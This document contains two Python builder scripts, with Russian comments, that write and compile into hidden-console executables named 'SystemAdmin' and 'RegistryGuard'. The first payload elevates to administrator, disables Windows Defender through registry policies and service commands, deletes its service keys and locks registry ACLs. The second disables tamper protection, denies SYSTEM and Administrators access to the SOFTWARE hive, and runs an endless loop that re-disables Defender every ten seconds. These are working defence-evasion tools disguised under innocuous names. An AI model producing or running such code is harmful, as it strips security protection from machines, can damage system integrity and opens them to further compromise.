import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_disabler():
    disabler_code = '''import os
import subprocess
import time
import ctypes
import sys

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

time.sleep(2)

# 1. БЛОКИРУЕМ ДОСТУП ЗАЩИТНИКА К РЕЕСТРУ
subprocess.run('icacls "C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE" /deny *S-1-1-0:(DE)', shell=True)

# 2. Устанавливаем настройки ДО блокировки
commands = [
    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
    'reg add "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /v "Start" /t REG_DWORD /d 4 /f',
    'sc stop WinDefend',
    'sc config WinDefend start= disabled',
    'sc stop WdNisSvc',
    'sc config WdNisSvc start= disabled',
    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"'
]

for cmd in commands:
    try:
        subprocess.run(cmd, shell=True, timeout=5)
        time.sleep(0.5)
    except:
        pass

# 3. УДАЛЯЕМ СЛУЖБУ ИЗ РЕЕСТРА ПОЛНОСТЬЮ
subprocess.run('reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /f', shell=True)
subprocess.run('reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisSvc" /f', shell=True)

print("Defender permanently disabled")
'''

    with open('perm_disable.py', 'w', encoding='utf-8') as f:
        f.write(disabler_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "SystemAdmin" perm_disable.py')
    print("EXE создан: SystemAdmin.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_disabler()
    compile_to_exe()




import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_protector():
    protector_code = '''import os
import subprocess
import time
import ctypes
import sys

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

time.sleep(1)

def protect_registry_key():
    # Создаем ключ если его нет
    subprocess.run('reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f', shell=True)
    
    # ЗАЩИЩАЕМ КЛЮЧ ОТ ИЗМЕНЕНИЙ
    commands = [
        # Запрещаем всем изменение ключа
        'icacls "C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE" /deny SYSTEM:(DE)',
        'icacls "C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE" /deny Administrators:(DE)',
        'icacls "C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE" /deny Users:(DE)',
        
        # Блокируем конкретную ветку Защитника
        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
        
        # Отключаем службу защиты от несанкционированного доступа
        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f'
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, timeout=5)
            time.sleep(0.3)
        except:
            pass
    
    # Запускаем постоянную защиту в фоне
    while True:
        # Каждые 10 секунд проверяем и восстанавливаем значение
        result = subprocess.run('reg query "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v DisableAntiSpyware', 
                              shell=True, capture_output=True, text=True)
        
        if "0x1" not in result.stdout:
            # Если значение изменилось - восстанавливаем
            subprocess.run('reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f', shell=True)
        
        time.sleep(10)

protect_registry_key()
'''

    with open('registry_protector.py', 'w', encoding='utf-8') as f:
        f.write(protector_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "RegistryGuard" registry_protector.py')
    print("EXE создан: RegistryGuard.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_protector()
    compile_to_exe()
